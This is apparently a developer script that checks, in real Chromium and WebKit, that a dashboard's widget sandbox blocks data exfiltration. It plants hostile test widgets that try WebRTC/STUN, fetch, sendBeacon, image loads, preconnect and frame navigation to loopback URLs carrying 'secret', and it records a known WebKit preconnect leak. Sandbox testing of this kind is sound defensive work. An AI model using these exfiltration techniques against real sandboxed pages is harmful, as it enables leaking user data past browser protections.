/**
 * The widget sandbox, checked in real browsers: can a widget get data off the Mac without a
 * network permission?
 *
 * vitest cannot run this — it needs Chromium and WebKit, and Playwright is not a dependency of
 * the project — so it is a script, run by hand after touching the bridge, the widget CSP, the
 * host-page CSP or the frames:
 *
 *   pnpm --filter ui build
 *   pnpm --filter server exec tsx ../scripts/check-widget-sandbox.ts
 *
 * It needs Playwright and its browsers somewhere: `PLAYWRIGHT=<path to the playwright package>`
 * (default: `require('playwright')`), and optionally `CHROMIUM=<executable>` and
 * `WEBKIT=<executable>` when the ones Playwright would pick are not installed.
 *
 * What it does: starts a throwaway server (its own data folder, port `SANDBOX_PORT` or 4319, no
 * access secret) whose dashboard holds the shipped widgets plus three hostile ones, opens `/` and
 * `/admin` in each browser, and listens on loopback for anything the hostile widgets manage to
 * send — a STUN packet, an HTTP request, a TCP connection. It fails on any packet, on any
 * Content-Security-Policy complaint from the dashboard or the admin themselves, and when a page
 * does not render. Screenshots go to `SANDBOX_OUT` (default: a temp folder).
 *
 * The hostile widgets:
 * - `zz-exfil`: WebRTC to a STUN server, fetch, beacon, an image, and finally navigating its own
 *   frame to `http://127.0.0.1:<port>/nav?d=…`.
 * - `zz-hop`: navigates its frame to a second page of its own, which would run without the bridge.
 * - `zz-rtclocal`: a built-in given WebRTC's `local` level. It asks for a STUN server anyway and
 *   hands in remote candidates on a public address; then, in Chromium with mDNS candidates off,
 *   two of its own connections open a data channel over host candidates — `local` still works.
 *
 * Known and reported, not failed: WebKit opens a TCP connection for `<link rel="preconnect">`
 * whatever the CSP says (Chromium does not). That leaks a host name, not a request; see
 * SECURITY.md.
 */

import { createRequire } from 'node:module'
import { mkdtemp, mkdir, writeFile, cp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createSocket } from 'node:dgram'
import { createServer } from 'node:net'
import { buildApp } from '../server/src/app.js'

const ROOT = resolve(fileURLToPath(new URL('..', import.meta.url)))
const PORT = Number(process.env.SANDBOX_PORT) || 4319
// The WebSocket accepts pages from 4242 and from the port FREMKIT_PORT names (ws/routes.ts).
process.env.FREMKIT_PORT = String(PORT)
const UDP = PORT + 1000
const TCP = PORT + 1001
/** Where the preconnect probe points; kept apart because WebKit is known to reach it. */
const PRECONNECT = PORT + 1002
const require = createRequire(import.meta.url)
const playwright = require(process.env.PLAYWRIGHT ?? 'playwright') as typeof import('playwright')

const hits: string[] = []

/** A widget folder: a manifest and one page, plus any extra file. */
async function widget(dir: string, id: string, script: string, extra: Record<string, string> = {}): Promise<void> {
  await mkdir(join(dir, id), { recursive: true })
  await writeFile(join(dir, id, 'manifest.json'), JSON.stringify({ id, name: id, version: '1.0.0', minSize: [8, 4], defaultSize: [8, 4] }))
  await writeFile(join(dir, id, 'index.html'),
    `<!doctype html><html><head><meta charset="utf-8"></head><body>${id}<script>
function say(s) { console.log('SANDBOX ${id}: ' + s) }
try { ${script} } catch (e) { say('threw ' + e) }
</script></body></html>`)
  for (const [name, body] of Object.entries(extra)) await writeFile(join(dir, id, name), body)
}

const STUN = `new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${UDP}' }] })`

async function main(): Promise<void> {
  const tmp = await mkdtemp(join(tmpdir(), 'fremkit-sandbox-'))
  const out = process.env.SANDBOX_OUT ?? tmp
  const widgetsDir = join(tmp, 'widgets')
  await cp(join(ROOT, 'widgets'), widgetsDir, { recursive: true })

  await widget(widgetsDir, 'zz-exfil', `
say('RTCPeerConnection is ' + typeof RTCPeerConnection + ', webkit ' + typeof webkitRTCPeerConnection)
try { var pc = ${STUN}; pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o) }); say('PEER CONNECTION MADE') } catch (e) { say('no peer connection: ' + e.name) }
try { delete window.RTCPeerConnection; say('after delete: ' + typeof RTCPeerConnection) } catch (e) { say('delete refused') }
try { fetch('http://127.0.0.1:${TCP}/fetch?d=secret').catch(function () { say('fetch refused') }) } catch (e) { say('fetch threw') }
try { navigator.sendBeacon('http://127.0.0.1:${TCP}/beacon?d=secret') } catch (e) {}
new Image().src = 'http://127.0.0.1:${TCP}/img?d=secret'
var l = document.createElement('link'); l.rel = 'preconnect'; l.href = 'http://127.0.0.1:${PRECONNECT}'; document.head.appendChild(l)
setTimeout(function () { say('navigating'); location.href = 'http://127.0.0.1:${TCP}/nav?d=secret' }, 1500)
`)
  await widget(widgetsDir, 'zz-hop', `
setTimeout(function () { say('hopping'); location.href = 'second.html' }, 1500)
`, {
    'second.html': `<!doctype html><script>console.log('SANDBOX zz-hop: SECOND PAGE RAN'); try { var pc = ${STUN}; pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o) }) } catch (e) {}</script>`,
  })
  await widget(widgetsDir, 'zz-rtclocal', `
var RTC = window.RTCPeerConnection
say('level local, constructor ' + typeof RTC)
var a = new RTC({ iceServers: [{ urls: 'stun:127.0.0.1:${UDP}' }, { urls: 'turn:127.0.0.1:${UDP}', username: 'u', credential: 'c' }] })
say('iceServers kept: ' + JSON.stringify(a.getConfiguration().iceServers))
say('constructor recovered: ' + (a.constructor !== RTC || Object.getPrototypeOf(a).constructor !== RTC))
var b = new RTC()
a.onicecandidate = function (e) { if (e.candidate) b.addIceCandidate(e.candidate) }
b.onicecandidate = function (e) { if (e.candidate) a.addIceCandidate(e.candidate) }
b.ondatachannel = function (e) { e.channel.onmessage = function (m) { say('DATA CHANNEL OPEN: ' + m.data) } }
var ch = a.createDataChannel('d')
ch.onopen = function () { ch.send('hello over loopback') }
a.createOffer().then(function (o) { return a.setLocalDescription(o) })
  .then(function () { return b.setRemoteDescription(a.localDescription) })
  .then(function () { return b.createAnswer() })
  .then(function (an) { return b.setLocalDescription(an) })
  .then(function () { return a.setRemoteDescription(b.localDescription) })
  .then(function () {
    return a.addIceCandidate({ candidate: 'candidate:9 1 udp 2122260223 198.51.100.7 ${UDP} typ host', sdpMid: '0' })
  })
  .then(function () {
    var c = new RTC()
    return c.setRemoteDescription({ type: 'offer', sdp: a.localDescription.sdp.replace(/\\r\\na=candidate[^\\r]*/g, '') + 'a=candidate:9 1 udp 2122260223 198.51.100.7 ${UDP} typ host\\r\\n' })
      .then(function () { say('public candidate in remote description: ' + /198\\.51\\.100\\.7/.test(c.remoteDescription.sdp)) })
  })
  .catch(function (e) { say('local flow error ' + e) })
`)

  const dataDir = join(tmp, 'data')
  const app = await buildApp({
    accessToken: null, dataDir, widgetsDir, port: PORT,
    uiDist: join(ROOT, 'ui', 'dist'),
    webrtcLocalBuiltins: new Set(['zz-rtclocal']),
  })
  await app.listen({ port: PORT, host: '127.0.0.1' })

  const udp = createSocket('udp4')
  udp.on('message', (m) => hits.push(`UDP ${m.length} bytes`))
  await new Promise<void>((r) => udp.bind(UDP, '127.0.0.1', r))
  const tcp = createServer((socket) => {
    hits.push('TCP connection')
    socket.on('data', (d) => { hits.push(`HTTP ${String(d).split('\r\n')[0]}`); socket.end('HTTP/1.1 204 No Content\r\n\r\n') })
    socket.on('error', () => {})
  })
  await new Promise<void>((r) => tcp.listen(TCP, '127.0.0.1', r))
  const preconnects: string[] = []
  const pre = createServer((socket) => { preconnects.push('TCP connection'); socket.on('error', () => {}); socket.on('data', (d) => preconnects.push(`HTTP ${String(d).split('\r\n')[0]}`)) })
  await new Promise<void>((r) => pre.listen(PRECONNECT, '127.0.0.1', r))

  // The hostile widgets on the dashboard's first page, beside a real one; then the shipped
  // dashboard as it was, for the pages' own CSP complaints (a widget's refusals would drown them).
  const base = `http://127.0.0.1:${PORT}`
  const initial = await (await fetch(`${base}/api/config`)).json() as Record<string, any>
  const hostile = structuredClone(initial)
  // Shipped widgets that subscribe to live data, so the screenshots show the bridge carrying it.
  const clean = structuredClone(initial)
  const shipped = ['clock', 'cpu', 'memory', 'uptime', 'network', 'pomodoro', 'weather']
  clean.widgets = Object.fromEntries(shipped.map((id) => [`${id}-zz`, { widgetId: id, settings: {} }]))
  clean.screens[0].pages[0].items = shipped.map((id, i) => ({ instanceId: `${id}-zz`, x: (i % 4) * 8, y: Math.floor(i / 4) * 4, w: 8, h: 4 }))
  // Fremplay, the one shipped widget at WebRTC's `local` level, rendered under its real bridge tag.
  clean.widgets['fremplay-zz'] = { widgetId: 'fremplay', settings: {} }
  clean.screens[0].pages[0].items.push({ instanceId: 'fremplay-zz', x: 32, y: 0, w: 8, h: 5 })
  hostile.widgets = {
    'zz-exfil-1': { widgetId: 'zz-exfil', settings: {} },
    'zz-hop-1': { widgetId: 'zz-hop', settings: {} },
    'zz-rtclocal-1': { widgetId: 'zz-rtclocal', settings: {} },
    'clock-zz': { widgetId: 'clock', settings: {} },
  }
  hostile.screens[0].pages[0].items = [
    { instanceId: 'zz-exfil-1', x: 0, y: 0, w: 8, h: 4 },
    { instanceId: 'zz-hop-1', x: 8, y: 0, w: 8, h: 4 },
    { instanceId: 'zz-rtclocal-1', x: 16, y: 0, w: 8, h: 4 },
    { instanceId: 'clock-zz', x: 24, y: 0, w: 16, h: 4 },
  ]
  const save = async (config: unknown) => {
    const saved = await fetch(`${base}/api/config`, { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify(config) })
    if (!saved.ok) throw new Error(`config refused: ${saved.status} ${await saved.text()}`)
  }

  const failures: string[] = []
  const notes: string[] = []
  const browsers: [string, import('playwright').BrowserType, import('playwright').LaunchOptions][] = [
    ['chromium', playwright.chromium, {
      ...(process.env.CHROMIUM ? { executablePath: process.env.CHROMIUM } : {}),
      // Real host candidates rather than mDNS names, so the `local` widget can show it connects.
      args: ['--disable-features=WebRtcHideLocalIpsWithMdns'],
    }],
    ['webkit', playwright.webkit, process.env.WEBKIT ? { executablePath: process.env.WEBKIT } : {}],
  ]
  for (const phase of ['hostile', 'clean'] as const) {
    await save(phase === 'hostile' ? hostile : clean)
    for (const [name, type, options] of browsers) {
      const browser = await type.launch(options)
      for (const path of ['/', '/admin']) {
        hits.length = 0
        preconnects.length = 0
        const page = await browser.newPage({ viewport: { width: 2560, height: 720 } })
        const said: string[] = []
        const complaints: string[] = []
        page.on('console', (m) => {
          const text = m.text()
          if (text.startsWith('SANDBOX ')) said.push(text.slice(8))
          else if (/Content Security Policy|Refused to/i.test(text)) complaints.push(text)
        })
        page.on('pageerror', (e) => complaints.push(`page error: ${e.message}`))
        await page.goto(`${base}${path}`)
        await page.waitForTimeout(5000)
        const label = `${phase} ${name} ${path}`
        const shot = join(out, `${phase}-${name}${path === '/' ? '-dashboard' : '-admin'}.png`)
        await page.screenshot({ path: shot })
        const rendered = await page.evaluate(() => document.querySelector('#app')?.children.length ?? 0)
        await page.close()
        notes.push(`${label}: screenshot ${shot}`)
        if (!rendered) failures.push(`${label}: the page did not render`)

        if (phase === 'clean') {
          if (complaints.length) failures.push(`${label}: CSP complaints or errors: ${complaints.join(' | ')}`)
          continue
        }
        if (hits.length) failures.push(`${label}: left the sandbox: ${[...new Set(hits)].join(', ')}`)
        // WebKit's known hole: a connection, never a request. Anything more, or Chromium doing it, fails.
        if (preconnects.some((h) => h.startsWith('HTTP')) || (name !== 'webkit' && preconnects.length)) {
          failures.push(`${label}: preconnect: ${[...new Set(preconnects)].join(', ')}`)
        } else if (preconnects.length) {
          notes.push(`${label}: KNOWN — WebKit opened a TCP connection for <link rel=preconnect> despite the CSP (a host name leaks, no request)`)
        }
        if (said.some((s) => /PEER CONNECTION MADE|SECOND PAGE RAN|constructor recovered: true|public candidate in remote description: true/.test(s))) {
          failures.push(`${label}: ${said.filter((s) => /MADE|RAN|true/.test(s)).join(' | ')}`)
        }
        if (!said.some((s) => s.startsWith('zz-exfil: no peer connection'))) failures.push(`${label}: the exfil widget never ran`)
        if (!said.some((s) => /iceServers kept: \[\]/.test(s))) failures.push(`${label}: the local widget kept an ICE server`)
        if (name === 'chromium' && !said.some((s) => s.includes('DATA CHANNEL OPEN'))) failures.push(`${label}: the local level no longer connects on this Mac`)
        notes.push(`${label}: ${said.join(' | ')}`)
      }
      await browser.close()
    }
  }

  await app.close()
  udp.close()
  tcp.close()
  pre.close()
  if (!process.env.SANDBOX_OUT) await rm(join(tmp, 'widgets'), { recursive: true, force: true })

  for (const n of notes) console.log(n)
  if (failures.length) {
    console.error(`\nFAIL\n${failures.join('\n')}`)
    process.exit(1)
  }
  console.log('\nPASS: nothing left the widget sandbox; the dashboard and the admin rendered with no CSP complaint.')
  process.exit(0)
}

main().catch((e) => { console.error(e); process.exit(1) })
